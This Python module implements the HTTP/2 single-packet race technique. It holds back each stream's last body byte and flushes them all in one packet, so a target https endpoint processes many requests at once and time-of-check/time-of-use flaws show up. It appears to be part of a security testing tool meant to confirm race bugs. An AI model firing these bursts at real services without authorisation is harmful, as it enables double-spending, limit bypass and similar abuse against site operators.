"""Single-packet (and last-byte) race engine for deterministic race confirmation.

The HTTP/2 single-packet attack coalesces N requests into one TCP segment so the
server processes them with ~0 timing jitter, exposing TOCTOU windows. A numeric
invariant (successes <= capacity) decides the verdict — confirmation, not abuse.
"""

from __future__ import annotations

import asyncio
import socket
import ssl
from urllib.parse import urlparse


class SinglePacketRacer:
    """Coalesced HTTP/2 burst against a single https endpoint."""

    def __init__(self, url: str):
        p = urlparse(url)
        if p.scheme != "https":
            raise ValueError("single-packet racer requires https (HTTP/2 over TLS)")
        self._host = p.hostname or ""
        self._port = p.port or 443
        self._authority = self._host + (f":{p.port}" if p.port else "")
        self._path = p.path + (f"?{p.query}" if p.query else "")

    def _tls(self) -> ssl.SSLContext:
        ctx = ssl.create_default_context()
        ctx.set_alpn_protocols(["h2"])
        return ctx

    def _headers(self, method: str, headers: dict[str, str]) -> list[tuple[str, str]]:
        drop = {"host", "content-length", "connection", "transfer-encoding",
                "keep-alive", "upgrade", "proxy-connection"}
        out = [(":method", method), (":authority", self._authority),
               (":scheme", "https"), (":path", self._path)]
        out += [(k.lower(), v) for k, v in headers.items() if k.lower() not in drop]
        return out

    async def race(self, method: str, headers: dict[str, str], body: bytes,
                   n: int, *, warmup: bool = True) -> list[int]:
        """Fire ``n`` coalesced requests; return the status code of each stream."""
        return await asyncio.wait_for(self._run(method, headers, body, n, warmup), timeout=30)

    async def _run(self, method: str, headers: dict[str, str], body: bytes,
                   n: int, warmup: bool) -> list[int]:
        import h2.config
        import h2.connection
        import h2.events

        reader, writer = await asyncio.open_connection(
            self._host, self._port, ssl=self._tls(), server_hostname=self._host)
        writer.get_extra_info("socket").setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        conn = h2.connection.H2Connection(h2.config.H2Configuration(client_side=True))
        conn.initiate_connection()
        writer.write(conn.data_to_send())
        await writer.drain()

        h2_headers = self._headers(method, headers)
        held: dict[int, bytes] = {}

        # Phase 1 — send every stream's HEADERS + all-but-last body byte.
        for _ in range(n):
            sid = conn.get_next_available_stream_id()
            conn.send_headers(sid, h2_headers, end_stream=False)
            if len(body) <= 1:
                held[sid] = body or b"\x00"
            else:
                conn.send_data(sid, body[:-1], end_stream=False)
                held[sid] = body[-1:]
        writer.write(conn.data_to_send())
        await writer.drain()
        if warmup:
            await asyncio.sleep(0.10)  # let the prelude land server-side

        # Phase 2 — flush all terminating bytes in ONE packet.
        for sid, last in held.items():
            conn.send_data(sid, last, end_stream=True)
        writer.write(conn.data_to_send())
        await writer.drain()

        statuses: dict[int, int] = {}
        while len(statuses) < n:
            chunk = await reader.read(65535)
            if not chunk:
                break
            for ev in conn.receive_data(chunk):
                if isinstance(ev, h2.events.ResponseReceived):
                    statuses[ev.stream_id] = int(dict(ev.headers)[b":status"])
                elif isinstance(ev, h2.events.DataReceived):
                    conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
                elif isinstance(ev, h2.events.StreamEnded):
                    statuses.setdefault(ev.stream_id, -1)
            out = conn.data_to_send()
            if out:
                writer.write(out)
                await writer.drain()

        writer.close()
        try:
            await writer.wait_closed()
        except Exception:  # noqa: BLE001 - best-effort close
            pass
        return list(statuses.values())
